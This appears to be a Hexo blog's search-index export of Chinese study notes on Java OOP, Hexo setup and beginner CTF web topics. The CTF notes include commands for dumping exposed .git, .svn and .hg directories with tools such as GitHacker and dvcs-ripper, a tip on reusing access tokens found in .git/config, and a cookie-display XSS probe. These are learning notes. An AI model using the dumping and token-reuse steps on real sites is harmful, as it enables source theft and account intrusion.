  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2 <span class="token keyword">instanceof</span> <span class="token class-name">Person</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//true</span>
  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2 <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><blockquote>
<p><strong>static</strong> 静态变量、方法推荐直接通过类名来访问；仅从属于该类；</p>
<p>但不可以通过类名来访问 <strong>非</strong> 静态变量，但可以通过实例化的类对象通过 <strong>‘.’</strong> 来访问。</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"匿名代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">static</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"静态代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span>
<span class="token comment">//执行顺序</span>
<span class="token comment">//	1.静态代码块</span>
<span class="token comment">//	2.匿名代码块</span>
<span class="token comment">//	3.构造方法</span>
<span class="token comment">//**静态代码块仅执行一次，2与3随着类对象的实例化反复按序调用**</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>opp<span class="token punctuation">.</span>demo07</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Math</span><span class="token punctuation">.</span>random<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Math</span><span class="token punctuation">.</span>PI<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//静态导入包载入后，可这样使用</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>PI<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//静态导入包载入后，可这样使用</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



</br>

<h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><blockquote>
<p>关键字：abtract</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>opp<span class="token punctuation">.</span>demo08</span><span class="token punctuation">;</span>

<span class="token comment">//  abstract抽象类，类只能单继承，但是接口可以多继承！</span>
<span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Action</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//  约束，实现接口的统一规范，有人帮我们实现~</span>
    <span class="token comment">//  abstract，抽象方法，只有方法名字，没有方法的实现~</span>
    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">doSomeThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">//  不能 new 这个抽象类，只能靠子类去实现；约束！</span>
    <span class="token comment">//  抽象类中可以写普通方法</span>
    <span class="token comment">//  抽象方法必须在抽象类中</span>
    <span class="token comment">//  抽象的抽象，约束</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="接口的定义与实现"><a href="#接口的定义与实现" class="headerlink" title="接口的定义与实现"></a>接口的定义与实现</h2><p><del>坏了，顶不住了，一点半该上床玩手机了，不然没时间了，逃</del></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>base</tag>
        <tag>notes</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/07/01/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>CTF:从0到1——札记（一）</title>
    <url>/2021/07/09/CTF/</url>
    <content><![CDATA[<h2 id="札记（一）——-敏感目录泄露"><a href="#札记（一）——-敏感目录泄露" class="headerlink" title="札记（一）——  敏感目录泄露"></a>札记（一）——  敏感目录泄露</h2><h3 id="1-git泄露"><a href="#1-git泄露" class="headerlink" title="1. git泄露"></a>1. git泄露</h3><blockquote>
<p><strong>git</strong>：<u>开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。</u></p>
</blockquote>
<p><strong>Hole</strong>：开发人员在开发过程中经常遗忘 <strong>.git</strong> 文件夹，这就导致攻击者可以通过 <strong>.git</strong> 文件夹中的信息获取开发人员所提交过的所有源码，进而导致攻击隐患。在<strong>CTF解题</strong>中即体现为<strong>flag</strong>的获取思路之一。</p>
<ul>
<li>（1）常规git泄露</li>
</ul>
<blockquote>
<p>此时借助工具可以<strong>直接获取</strong>网站源码，或者flag，无需额外操作。</p>
<blockquote>
<p>Tool：<a href="https://github.com/denny0223/scrabble"><strong>scrabble</strong></a></p>
<p>命令：<del>（kali终端中输入）</del>   ./scrabble <a href="http://example.com/">http://example.com</a></p>
</blockquote>
</blockquote>
<ul>
<li>（2）git回滚</li>
</ul>
<p>git 记录每次提交<del>（commit）</del>的修改，题中泄漏的敏感文件<del>（如flag.php）</del>可能已经被删除或覆盖了，此时可以利用 git 的<code>git reset</code>命令来恢复以前的版本。</p>
<blockquote>
<p>./scrabble <a href="http://xxxx.com/">http://xxxx.com</a></p>
<p>发现 HEAD <del>（即当前版本，上一版本是HEAD^）</del>文件是 old</p>
<p>执行命令：git reset –hard HEAD^</p>
</blockquote>
<p>另一种方式：</p>
<blockquote>
<p>git log-stat</p>
<p>查看修改了哪些文件</p>
<p>git diff HEAD commit-id</p>
<p>比较当前版本与想查看的commit之间的变化</p>
</blockquote>
<ul>
<li>（3）git分支</li>
</ul>
<blockquote>
<p>每次提交，<strong>git</strong> 会自动把他们串成一条时间线，这个时间线就是一个**<u>分支</u><strong>。</strong>git** 允许使用多个分支，如果没有新建分支，那么只有一条时间线，即只有一条分支，<strong>git</strong> 中默认为 <strong>master</strong> 分支。</p>
</blockquote>
<blockquote>
<p>Tool：<a href="https://github.com/WangYihang/GitHacker">GitHacker</a></p>
</blockquote>
<blockquote>
<p>命令：python GitHacker.py &lt;url&gt;.git</p>
<blockquote>
<p>或者：githacker –url <a href="http://127.0.0.1/.git/">http://127.0.0.1/.git/</a> –folder result</p>
</blockquote>
<p>运行后本地生成文件夹，进入执行以下命令：</p>
<blockquote>
<p>git log–all  或   git branch-v</p>
<p>只能看到master分支的信息</p>
<p>执行以下命令：</p>
<blockquote>
<p>git reflog</p>
<p>可以看到一些<strong>checkout</strong>的记录</p>
<p>或可执行以下命令，下载某分支的head信息到/.git/xxx/xxx/xxx中：</p>
<blockquote>
<p>wget &lt;url&gt;/.git/xxx/xxx/xxx</p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<ul>
<li>（4）其他</li>
</ul>
<p>除了以上查看源码的利用方式，查看<code>.git/config</code>文件夹可能包含的<code>access_token</code>信息，可藉此访问这个用户的其他仓库。</p>
<h3 id="2-SVN泄露"><a href="#2-SVN泄露" class="headerlink" title="2. SVN泄露"></a>2. SVN泄露</h3><blockquote>
<p>SVN (subversion): 是源代码版本管理软件。</p>
</blockquote>
<p><strong>Hole：</strong>管理员操作不规范将SVN隐藏文件夹暴露于外网环境，可以利用<code>.svn/entries</code>或<code>wc.db</code>文件获取服务器源码等信息。</p>
<blockquote>
<p>Tools：</p>
<blockquote>
<ol>
<li><p><a href="https://github.com/kost/dvcs-riper">https://github.com/kost/dvcs-riper</a></p>
</li>
<li><p>Seay-svn（Windows下的源代码备份漏洞利用工具）</p>
</li>
</ol>
</blockquote>
</blockquote>
<h3 id="3-HG泄露"><a href="#3-HG泄露" class="headerlink" title="3.HG泄露"></a>3.HG泄露</h3><p><strong>Hole：</strong>初始化项目时，HG会在当前文件夹下创建一个<code>.hg</code>隐藏文件夹，其中<strong>包含代码和分支修改</strong>等信息。</p>
<blockquote>
<p>Tool: <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p>
</blockquote>
<h4 id="开源工具"><a href="#开源工具" class="headerlink" title="开源工具"></a>开源工具</h4><p><a href="https://github.com/maurosoria/dirseach">dirsearch</a></p>
<p><del>嘤嘤嘤，老是下载失败，使用魔法了也还是失败，哭了</del></p>
<p><img src="CTF./dirsearchFailed.png" alt="dirsearchFailed" loading="lazy"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>flag</tag>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF_Web初步</title>
    <url>/2021/07/12/CTF_Web_Base/</url>
    <content><![CDATA[<h1 id="CTF-Web初步"><a href="#CTF-Web初步" class="headerlink" title="CTF_Web初步"></a>CTF_Web初步</h1><h2 id="HTML-基本语法"><a href="#HTML-基本语法" class="headerlink" title="HTML_基本语法"></a>HTML_基本语法</h2><p>表单</p>
<blockquote>
<p>用“GET”方法传给服务器数据时，URL会将某些数据显示在 “?” 后面显示出来；</p>
<p>用“POST”方法传给服务器数据时，则不会。    //method=”post”</p>
</blockquote>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">//p标签表示一个段落
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
//浮动框架iframe，使得浏览器页面可以嵌套其他子窗口,frameborder=0使得嵌入的网页边线为零
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>0</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>0</span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>0</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
//换行标签，单独一个，不成对
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
//原样输出标签，省去换行符号啥的
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span>
//注释标签<span class="token comment">&lt;!--   注释内容   --></span>
<span class="token comment">&lt;!--
啦啦啦~~
--></span>
//图片标签
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>图片url<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>图片描述信息<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
//文本超链接
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">herf</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xxx<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>跳转某网站<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
//图片超链接
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">herf</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">></span></span>								//告诉浏览器该文件的类型
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">hang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh_CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>							//HTML文件开始
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>									//头部
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hello,World!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>			//网页标题
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>									//主体开始
        这是一句话~Hello,World!				 //主体内容
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="PHP-基本语法"><a href="#PHP-基本语法" class="headerlink" title="PHP_基本语法"></a>PHP_基本语法</h2><p>动态语言。是看不到你这个后端的代码的嗷~</p>
<p>一个简单的PHP小程序：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>						<span class="token comment">//表示程序开始</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hello,World!'</span><span class="token punctuation">;</span>	<span class="token comment">//分号是需要的</span>
    <span class="token delimiter important">?></span></span>						//表示程序结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul>
<li><p>以 <strong>“$”</strong> 开头，对 **大小写 **敏感；</p>
</li>
<li><p>可以直接通过 <strong>赋值</strong> 来指定变量 <strong>类型</strong> ；</p>
</li>
<li><p><strong>双引号</strong> 中的变量会被解析执行，<strong>单引号</strong> 中则会被原样输出；</p>
</li>
<li><p><strong>“.”</strong> 用于连接字符串。</p>
</li>
</ul>
<p>如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span>					<span class="token comment">//赋值指定类型</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$a</span></span>+<span class="token interpolation"><span class="token variable">$b</span></span>="</span><span class="token operator">.</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token punctuation">;</span>				<span class="token comment">//连接字符串，解析为：1+2=3</span>
<span class="token comment">//	echo '$a+'$b='.'$c';			//输出：$a+$b=$c</span>
<span class="token comment">//	echo "'$a'+'$b'="."'$c'";		//输出：'2'+'3'='5'</span>
    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出HTML代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
	<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1><span class="token interpolation"><span class="token variable">$a</span></span>+<span class="token interpolation"><span class="token variable">$b</span></span>="</span><span class="token operator">.</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>&lt;/h1>"</span><span class="token punctuation">;</span><span class="token comment">//在浏览器中查看源码显示：&lt;h1>2+3=5&lt;/h1></span>
    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="isset-函数"><a href="#isset-函数" class="headerlink" title="isset()函数"></a>isset()函数</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断变量是否存在。存在返回值1，不存在返回值空。</span>
    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><del>待补充</del></p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//	单行注释</span>
<span class="token comment">#	单行注释</span>
<span class="token comment">/*
	多行注释
*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="接收表单数据"><a href="#接收表单数据" class="headerlink" title="接收表单数据"></a>接收表单数据</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>用户名："</span><span class="token operator">.</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$username</span></span>&lt;/p>"</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>密码："</span><span class="token operator">.</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$password</span></span>&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>PHP内置；</p>
<p><code>$_GET</code>              ：接收通过get方法传递数据；</p>
<p><code>$_POST</code>            ：接收通过post方法传递的数据；</p>
<p><code>$_REQUEST</code>      ：接收通过get和post方法传递的数据。</p>
<h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>if</p>
<p>for</p>
<p>while</p>
<h3 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h3><p>一般步骤：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ip_url"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//连接上mysql</span>
		<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//选择要操作的数据库</span>
		<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置客户端和连接字符集,也可在其中嵌入select语句("某查询语句",$conn)</span>
		<span class="token comment">//增删改查</span>
		<span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放连接资源</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="JavaScript基本语法"><a href="#JavaScript基本语法" class="headerlink" title="JavaScript基本语法"></a>JavaScript基本语法</h2><p>对HTML在功能上的扩展，与Java没关系，前端语言，嵌在HTML里，在客户端浏览器上执行。XSS。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//语句包含在以下的标签中</span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">"ctfer"</span><span class="token punctuation">;</span>									<span class="token comment">//变量必须通过var语句定义</span>
    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;h1>Hello,World!"</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">"&lt;/h1>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//拼接字符串采用 "+"</span>
	<span class="token comment">//document是个对象，指向当前网页，write是其动作。</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="JS能处理的常见事件："><a href="#JS能处理的常见事件：" class="headerlink" title="JS能处理的常见事件："></a>JS能处理的常见事件：</h3><table>
<thead>
<tr>
<th align="center">事件处理程序</th>
<th align="center">触发时机</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onClick</td>
<td align="center">用户单击</td>
</tr>
<tr>
<td align="center">onError</td>
<td align="center">加载图像发生错误</td>
</tr>
<tr>
<td align="center">onLoad</td>
<td align="center">文档、图像或对象完成加载时</td>
</tr>
<tr>
<td align="center">onSubmit</td>
<td align="center">用户提交窗体form时</td>
</tr>
</tbody></table>
<h3 id="document对象的常用属性"><a href="#document对象的常用属性" class="headerlink" title="document对象的常用属性"></a>document对象的常用属性</h3><p>对某个事件作出反应：</p>
<p><code>alert</code>：弹窗语句</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//显示当前页面的cookie</span>
<span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//显示当前页面的URL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="location-href实现页面跳转"><a href="#location-href实现页面跳转" class="headerlink" title="location.href实现页面跳转"></a>location.href实现页面跳转</h3><p>当前页面跳转到另一个页面上去：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>
	location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxx"</span><span class="token punctuation">;</span>		<span class="token comment">//location.href可简写成location</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="confirm语句"><a href="#confirm语句" class="headerlink" title="confirm语句"></a>confirm语句</h3><p>显示确认选择对话框，返回true或false。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>notes</tag>
        <tag>JS</tag>
        <tag>PHP</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
</search>
